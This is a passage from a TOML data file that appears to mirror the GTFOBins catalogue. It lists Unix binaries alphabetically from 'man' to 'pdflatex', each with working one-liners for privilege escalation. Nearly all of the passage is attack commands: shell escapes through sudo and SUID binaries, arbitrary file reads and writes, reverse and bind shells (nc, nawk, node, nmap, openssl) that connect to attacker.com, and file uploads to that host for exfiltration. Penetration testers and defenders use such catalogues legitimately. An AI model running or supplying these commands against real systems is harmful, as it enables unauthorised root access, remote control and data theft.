      exp = "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
[[privilege-esclation]]
  Name = "man"
  Description = "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
  Tags = ["shell", "file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "man file_to_read"
    [[privilege-esclation.exps.shell]]
      exp = "man man\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "man '-H/bin/sh #' man\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo man man\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "mawk"
  Description = ""
  Tags = ["shell", "file-write", "file-read", "suid", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmawk '//' \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./mawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.shell]]
      exp = "mawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "more"
  Description = ""
  Tags = ["shell", "file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "more file_to_read"
    [[privilege-esclation.exps.shell]]
      exp = "TERM= more /etc/profile\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TERM= sudo more /etc/profile\n!/bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./more file_to_read"
[[privilege-esclation]]
  Name = "mosquitto"
  Description = "The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmosquitto -c \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "mount"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"
[[privilege-esclation]]
  Name = "msfconsole"
  Description = "This allows to spawn a [`ruby`](/gtfobins/ruby/) interpreter."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
[[privilege-esclation]]
  Name = "msgattrib"
  Description = "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data."
  Tags = ["file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmsgattrib -P $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
[[privilege-esclation]]
  Name = "msgcat"
  Description = "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data."
  Tags = ["file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmsgcat -P $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo msgcat -P $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./msgcat -P $LFILE\n"
[[privilege-esclation]]
  Name = "msgconv"
  Description = "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data."
  Tags = ["sudo", "suid", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmsgconv -P $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./msgconv -P $LFILE\n"
[[privilege-esclation]]
  Name = "msgfilter"
  Description = ""
  Tags = ["suid", "shell", "file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmsgfilter -P -i \"LFILE\" /bin/cat\n"
    [[privilege-esclation.exps.shell]]
      exp = "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n"
    [[privilege-esclation.exps.suid]]
      exp = "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n"
[[privilege-esclation]]
  Name = "msgmerge"
  Description = "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data."
  Tags = ["suid", "file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
[[privilege-esclation]]
  Name = "msguniq"
  Description = "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data."
  Tags = ["file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmsguniq -P $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo msguniq -P $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./msguniq -P $LFILE\n"
[[privilege-esclation]]
  Name = "mtr"
  Description = "The read file content is corrupted by error prints.\n"
  Tags = ["sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nmtr --raw -F \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "multitime"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "multitime /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo multitime /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./multitime /bin/sh -p"
[[privilege-esclation]]
  Name = "mv"
  Description = "This can be used to move and then read or write files from a restricted file systems or with elevated privileges."
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
[[privilege-esclation]]
  Name = "mysql"
  Description = "A valid MySQL server must be available."
  Tags = ["limited-suid", "library-load", "shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.library-load]]
      exp = "mysql --default-auth ../../../../../path/to/lib"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./mysql -e '\\! /bin/sh'"
    [[privilege-esclation.exps.shell]]
      exp = "mysql -e '\\! /bin/sh'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo mysql -e '\\! /bin/sh'"
[[privilege-esclation]]
  Name = "nano"
  Description = ""
  Tags = ["shell", "file-write", "file-read", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "nano file_to_read"
    [[privilege-esclation.exps.file-write]]
      exp = "nano file_to_write\nDATA\n^O\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./nano -s /bin/sh\n/bin/sh\n^T\n"
    [[privilege-esclation.exps.shell]]
      exp = "nano\n^R^X\nreset; sh 1>&0 2>&0\n"
    [[privilege-esclation.exps.shell]]
      exp = "nano -s /bin/sh\n/bin/sh\n^T\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
[[privilege-esclation]]
  Name = "nasm"
  Description = "The file content is treated as command line options and disclosed throught error messages, so this is not suitable for reading arbitrary binary data."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nnasm -@ $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./nasm -@ $LFILE\n"
[[privilege-esclation]]
  Name = "nawk"
  Description = ""
  Tags = ["suid", "sudo", "limited-suid", "shell", "non-interactive-reverse-shell", "non-interactive-bind-shell", "file-write", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nnawk '//' \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./nawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "LPORT=12345\nnawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"
    [[privilege-esclation.exps.shell]]
      exp = "nawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "nc"
  Description = ""
  Tags = ["limited-suid", "reverse-shell", "bind-shell", "file-upload", "file-download", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.bind-shell]]
      exp = "LPORT=12345\nnc -l -p $LPORT -e /bin/sh\n"
    [[privilege-esclation.exps.file-download]]
      exp = "LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\"\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\"\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT\n"
    [[privilege-esclation.exps.sudo]]
      exp = "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"
[[privilege-esclation]]
  Name = "ncftp"
  Description = ""
  Tags = ["suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "ncftp\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ncftp\n!/bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./ncftp\n!/bin/sh -p\n"
[[privilege-esclation]]
  Name = "neofetch"
  Description = ""
  Tags = ["file-read", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nneofetch --ascii $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nneofetch --config $TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
[[privilege-esclation]]
  Name = "nft"
  Description = "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files. This requires version `nftables` v0.9.0."
  Tags = ["sudo", "file-read", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nnft -f \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./nft -f \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "nice"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "nice /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo nice /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./nice /bin/sh -p"
[[privilege-esclation]]
  Name = "nl"
  Description = "The read file content is corrupted by a leading space added to each line."
  Tags = ["suid", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
[[privilege-esclation]]
  Name = "nm"
  Description = "The file content is treated as command line options and disclosed through error messages, so this is not suitable for reading arbitrary binary data."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nnm @$LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo nm @$LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./nm @$LFILE\n"
[[privilege-esclation]]
  Name = "nmap"
  Description = ""
  Tags = ["file-download", "limited-suid", "sudo", "suid", "shell", "non-interactive-reverse-shell", "non-interactive-bind-shell", "file-upload", "file-write", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF\n"
    [[privilege-esclation.exps.file-read]]
      exp = "TF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF\n"
    [[privilege-esclation.exps.file-write]]
      exp = "TF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nnmap -oG=$LFILE DATA\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF\n"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "export LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n"
    [[privilege-esclation.exps.shell]]
      exp = "nmap --interactive\nnmap> !sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo nmap --interactive\nnmap> !sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
[[privilege-esclation]]
  Name = "node"
  Description = ""
  Tags = ["file-download", "file-upload", "reverse-shell", "bind-shell", "capabilities", "shell", "file-read", "sudo", "file-write", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.bind-shell]]
      exp = "export LPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT)'\n"
    [[privilege-esclation.exps.capabilities]]
      exp = "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nnode -e 'require(\"http\").get(process.env.URL, res => res.pipe(require(\"fs\").createWriteStream(process.env.LFILE)))'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com\nexport LFILE=file_to_send\nnode -e 'require(\"fs\").createReadStream(process.env.LFILE).pipe(require(\"http\").request(process.env.URL))'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "node -e 'require(\"fs\").writeFileSync(\"file_to_write\", \"DATA\")'"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'\n"
    [[privilege-esclation.exps.shell]]
      exp = "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
    [[privilege-esclation.exps.suid]]
      exp = "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
[[privilege-esclation]]
  Name = "nohup"
  Description = ""
  Tags = ["suid", "sudo", "shell", "command"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out\n"
    [[privilege-esclation.exps.shell]]
      exp = "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
    [[privilege-esclation.exps.sudo]]
      exp = "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
    [[privilege-esclation.exps.suid]]
      exp = "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
[[privilege-esclation]]
  Name = "npm"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "npm exec /bin/sh"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nnpm -C $TF i\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n"
[[privilege-esclation]]
  Name = "nroff"
  Description = ""
  Tags = ["file-read", "shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nnroff $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
[[privilege-esclation]]
  Name = "nsenter"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "nsenter /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo nsenter /bin/sh"
[[privilege-esclation]]
  Name = "octave"
  Description = "The payloads are compatible with GUI."
  Tags = ["sudo", "limited-suid", "shell", "file-write", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "octave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
    [[privilege-esclation.exps.file-write]]
      exp = "octave-cli --eval 'filename = \"file_to_write\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./octave-cli --eval 'system(\"/bin/sh\")'"
    [[privilege-esclation.exps.shell]]
      exp = "octave-cli --eval 'system(\"/bin/sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo octave-cli --eval 'system(\"/bin/sh\")'"
[[privilege-esclation]]
  Name = "od"
  Description = "Three spaces are added before each character in the read file, and non-printable chars are printed as backslash escape sequences."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "openssl"
  Description = ""
  Tags = ["reverse-shell", "file-upload", "file-download", "file-write", "file-read", "suid", "sudo", "library-load"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > \"$LFILE\"\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nopenssl enc -in \"$LFILE\"\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nopenssl enc -in \"$TF\" -out \"$LFILE\"\n"
    [[privilege-esclation.exps.library-load]]
      exp = "openssl req -engine ./lib.so"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
    [[privilege-esclation.exps.sudo]]
      exp = "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
    [[privilege-esclation.exps.suid]]
      exp = "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "openvpn"
  Description = ""
  Tags = ["file-read", "suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nopenvpn --config \"$LFILE\"\n"
    [[privilege-esclation.exps.shell]]
      exp = "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "openvt"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n"
[[privilege-esclation]]
  Name = "opkg"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo opkg install x_1.0_all.deb\n"
[[privilege-esclation]]
  Name = "pandoc"
  Description = ""
  Tags = ["file-read", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\npandoc -t plain \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\necho DATA | pandoc -t plain -o \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\necho DATA | sudo pandoc -t plain -o \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "paste"
  Description = ""
  Tags = ["suid", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\npaste $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo paste $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\npaste $LFILE\n"
[[privilege-esclation]]
  Name = "pax"
  Description = ""
  Tags = ["file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\npax -w \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "pdb"
  Description = "This allows to execute [`python`](/gtfobins/python/) code, other functions may apply."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
[[privilege-esclation]]
  Name = "pdflatex"
  Description = ""
  Tags = ["file-read", "sudo", "limited-suid", "shell"]
